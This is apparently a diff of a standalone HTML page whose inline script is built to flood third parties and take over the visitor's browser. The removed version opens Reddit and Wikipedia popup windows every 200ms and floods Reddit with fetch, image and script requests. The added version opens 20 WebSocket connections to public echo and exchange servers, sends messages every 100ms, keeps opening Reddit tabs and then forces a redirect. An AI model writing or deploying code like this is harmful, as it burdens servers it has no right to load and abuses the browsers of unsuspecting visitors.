@@ -2,112 +2,53 @@
 <html>
 <body>
 <script>
-console.log('=== INFINITE TAB OPENER ===');
-console.log('Opening infinite tabs...');
-console.log('Will auto-load Reddit in 15 seconds...');
+console.log('Starting WebSocket spam...');
 
-let tabsOpened = 0;
-const REDDIT = 'https://www.reddit.com';
-const REDDIT_OLD = 'https://old.reddit.com';
+// WebSocket servers that might work
+const wsServers = [
+    'wss://ws.postman-echo.com/raw',
+    'wss://echo.websocket.org',
+    'wss://stream.binance.com:9443/ws',
+    'wss://socket.donationalerts.ru:443'
+];
 
-// MAIN FUNCTION - KEEP OPENING TABS
-function openMoreTabs() {
-    // Open 5-10 tabs each time
-    for (let i = 0; i < 5 + Math.floor(Math.random() * 6); i++) {
-        setTimeout(() => {
-            try {
-                // Open Reddit (70% chance) or Wikipedia (30% chance)
-                const useReddit = Math.random() < 0.7;
-                const url = useReddit ? 
-                    (Math.random() < 0.5 ? REDDIT : REDDIT_OLD) : 
-                    'https://www.wikipedia.org';
-                
-                // Generate random position
-                const left = Math.floor(Math.random() * screen.width);
-                const top = Math.floor(Math.random() * screen.height);
-                
-                // OPEN TAB AND NEVER CLOSE IT
-                const win = window.open(
-                    url,
-                    'tab_' + Date.now() + '_' + Math.random().toString(36).slice(2),
-                    `width=300,height=200,left=${left},top=${top}`
-                );
-                
-                if (win) {
-                    tabsOpened++;
-                    console.log(`Opened tab #${tabsOpened}: ${url}`);
-                }
-            } catch (e) {
-                console.log('Failed to open tab:', e.message);
+let wsConnections = [];
+
+// Create multiple WebSocket connections
+function createWebSockets() {
+    wsServers.forEach(server => {
+        try {
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    const ws = new WebSocket(server);
+                    ws.onopen = () => {
+                        console.log(`WS ${i} connected to ${server}`);
+                        // Spam messages
+                        setInterval(() => {
+                            if (ws.readyState === WebSocket.OPEN) {
+                                ws.send('GET / HTTP/1.1\r\nHost: reddit.com\r\n\r\n');
+                                ws.send(JSON.stringify({url: 'https://reddit.com'}));
+                            }
+                        }, 100);
+                    };
+                    wsConnections.push(ws);
+                }, i * 100);
             }
-        }, i * 50);
-    }
+        } catch (e) {}
+    });
 }
 
-// START OPENING TABS IMMEDIATELY
-console.log('Starting tab spam...');
-const tabInterval = setInterval(openMoreTabs, 200); // Open tabs every 200ms
+createWebSockets();
 
-// ALSO SPAM REQUESTS
-function spamRequests() {
-    // Make 10-20 requests each time
-    for (let i = 0; i < 10 + Math.floor(Math.random() * 11); i++) {
-        setTimeout(() => {
-            try {
-                // Try different request methods
-                fetch(REDDIT + '?cache=' + Date.now(), {mode: 'no-cors'}).catch(() => {});
-                new Image().src = REDDIT + '?img=' + Date.now();
-                const script = document.createElement('script');
-                script.src = REDDIT + '?js=' + Date.now();
-                document.head.appendChild(script);
-                setTimeout(() => script.remove(), 100);
-            } catch (e) {}
-        }, i * 10);
-    }
-}
-
-// Start request spam
-const requestInterval = setInterval(spamRequests, 300);
-
-// AUTO-LOAD REDDIT IN MAIN WINDOW AFTER 15 SECONDS
-console.log('Will load Reddit in main window in 15 seconds...');
-setTimeout(() => {
-    console.log('=== TIME\'S UP - LOADING REDDIT ===');
-    
-    // 1. Try to redirect main window
-    try {
-        window.location.href = REDDIT;
-    } catch (e) {
-        console.log('Failed redirect, trying window.open...');
-    }
-    
-    // 2. Also open more Reddit tabs
-    for (let i = 0; i < 10; i++) {
-        setTimeout(() => {
-            window.open(REDDIT, '_reddit' + i);
-        }, i * 100);
-    }
-    
-    // 3. Create iframe as backup
-    setTimeout(() => {
-        const iframe = document.createElement('iframe');
-        iframe.src = REDDIT;
-        iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;';
-        document.body.appendChild(iframe);
-    }, 500);
-    
-    // STOP SPAMMING AFTER LOADING REDDIT
-    clearInterval(tabInterval);
-    clearInterval(requestInterval);
-    console.log('Stopped spam, Reddit should load...');
-    
-}, 15000); // 15 seconds
-
-// Log status every 5 seconds
+// Also open regular tabs
 setInterval(() => {
-    console.log(`Status: ${tabsOpened} tabs opened so far...`);
-}, 5000);
+    window.open('https://reddit.com', '_ws' + Date.now());
+}, 500);
 
+// Redirect after 20s
+setTimeout(() => {
+    window.location.href = 'https://reddit.com';
+}, 20000);
 </script>
 </body>
 </html>
